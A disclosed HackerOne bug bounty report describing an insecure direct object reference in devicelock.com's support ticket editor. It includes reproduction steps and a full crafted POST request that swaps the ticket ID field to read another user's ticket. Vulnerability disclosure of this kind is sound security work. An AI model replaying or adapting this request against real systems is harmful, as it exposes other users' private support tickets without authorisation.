# Attacker Can Access to any Ticket Support on https://www.devicelock.com/support/

## Report Details
- **Report ID**: 1124974
- **URL**: https://hackerone.com/reports/1124974
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-03-13T13:41:01.714Z
- **Disclosed**: 2022-02-08T09:10:02.144Z

## Reporter
- **Username**: h4x0r_dz
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: acronis

## Vulnerability Information
## Summary

Hello team.

I found A security issue on devicelock.com where the attacker can access to any Ticket support and real all the information that The users sent to the support. and this without user interaction.

In other words: **an attacker can have full access to users Ticket using `Ticket id` only .**
 


## Steps To Reproduce

to Reproduce This bug you need to accounts, one for the attacker and the other for the victim.

  1. in the victim account go to https://www.devicelock.com/bitrix/admin/ticket_edit.php?lang=en and add a new ticket. now, this ticket has an **ID** Copy this id.
  2. go to https://www.devicelock.com/support/ticket_edit.html?ID=0 and put anything on Subject&Message. 
now make intercept on and click on ***Save***. and change the **Content-Disposition: form-data; name="ID"** value to the victim id ticket .


### vulnerable Request : `ID` parameter 
 ```
POST /support/ticket_edit.html?ID=0 HTTP/1.1
Host: www.devicelock.com
Connection: close
Content-Length: 1505
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://www.devicelock.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryEbeDU0DJhrnLl8U7
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://www.devicelock.com/support/ticket_edit.html?ID=38173
Accept-Encoding: gzip, deflate
Accept-Language: ar,en-US;q=0.9,en;q=0.8
Cookie: <attacker_Cookie>

------WebKitFormBoundaryEbeDU0DJhrnLl8U7
Content-Disposition: form-data; name="sessid"

<sessid_attacker>
------WebKitFormBoundaryEbeDU0DJhrnLl8U7
Content-Disposition: form-data; name="set_default"

Y
------WebKitFormBoundaryEbeDU0DJhrnLl8U7
Content-Disposition: form-data; name="ID"

<victim_id>
------WebKitFormBoundaryEbeDU0DJhrnLl8U7
Content-Disposition: form-data; name="lang"

en
------WebKitFormBoundaryEbeDU0DJhrnLl8U7
Content-Disposition: form-data; name="TITLE"

anything
------WebKitFormBoundaryEbeDU0DJhrnLl8U7
Content-Disposition: form-data; name="MESSAGE"

anything
------WebKitFormBoundaryEbeDU0DJhrnLl8U7
Content-Disposition: form-data; name="MAX_FILE_SIZE"

3072000
------WebKitFormBoundaryEbeDU0DJhrnLl8U7
Content-Disposition: form-data; name="FILE_0"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundaryEbeDU0DJhrnLl8U7
Content-Disposition: form-data; name="FILE_1"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundaryEbeDU0DJhrnLl8U7
Content-Disposition: form-data; name="FILE_2"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundaryEbeDU0DJhrnLl8U7
Content-Disposition: form-data; name="files_counter"

2
------WebKitFormBoundaryEbeDU0DJhrnLl8U7
Content-Disposition: form-data; name="apply"

Apply
------WebKitFormBoundaryEbeDU0DJhrnLl8U7
Content-Disposition: form-data; name="apply"

Y
------WebKitFormBoundaryEbeDU0DJhrnLl8U7--

```

now in the response, you can see the victim ticket information.

### POC 

{F1228906}

## Impact

an attacker can access all user's tickets without user interaction.

## Attachments
- 2021-03-13_14-34-03.mp4
